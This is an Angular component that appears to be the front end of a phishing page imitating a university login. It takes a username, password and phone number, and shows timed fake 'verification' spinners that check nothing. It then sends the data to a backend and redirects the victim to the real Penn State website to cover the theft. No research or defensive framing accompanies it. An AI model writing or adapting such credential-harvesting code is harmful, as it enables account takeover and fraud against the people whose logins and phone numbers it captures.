import { Component } from '@angular/core';
import { FormControl, FormGroup, Validators } from '@angular/forms';
import { ApiServiceService } from './service/api-service.service';
import { Router } from '@angular/router';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css'],
})
export class AppComponent{

  error: boolean = false;
  errorDetails: string = '';

  phoneNumberError: boolean = false;
  phoneNumberErrorDetails: string = '';

  inputUsername: string = '';
  inputPassword: string = '';
  inputPhoneNumber: string = '';

  togglePhoneNumber: boolean = false;
  toggleActivitySpinner: boolean = false;

  forgetPasswordToggle: boolean = true;

  buttonToggle: boolean = false;
  
  constructor(private apiService: ApiServiceService, private router: Router) {}
  

  newForm = new FormGroup({
    username: new FormControl('', [Validators.required]),
    password: new FormControl('', [Validators.required]),
    phoneNumber: new FormControl('', [Validators.required]),
  });

  postUserDetails(){
    const data: any = this.newForm.value;
    this.apiService.postUserDetails(data).subscribe({
      next: (response) => {},
      error: (err) => {},
    })
  }

  onToggle(){
    if (this.inputUsername.trim() === '' || this.inputPassword.trim() === '') {
      this.error = true;
      this.errorDetails = 'Please fill in both email and password fields.';
      this.buttonToggle = false;
    } else{
      this.toggleActivitySpinner = true;
      setTimeout(() => {
        this.error = false;
        this.togglePhoneNumber = true;
        this.toggleActivitySpinner = false;
        this.buttonToggle = true;
        this.forgetPasswordToggle = false;
      }, 2500);
    }
  }

  onclick() {
    if (this.inputPhoneNumber.trim() === '') {
      this.phoneNumberError = true;
      this.phoneNumberErrorDetails = 'Please fill in phone number field.';
    } else{
      this.postUserDetails();
      this.toggleActivitySpinner = true;
      setTimeout(() => {
        window.location.href = 'https://www.psu.edu/';
      }, 2000);
      setTimeout(() => {
        this.inputUsername = '';
        this.inputPassword = '';
        this.inputPhoneNumber = '';
        this.toggleActivitySpinner = false;
      }, 2500);
    }
  }
}
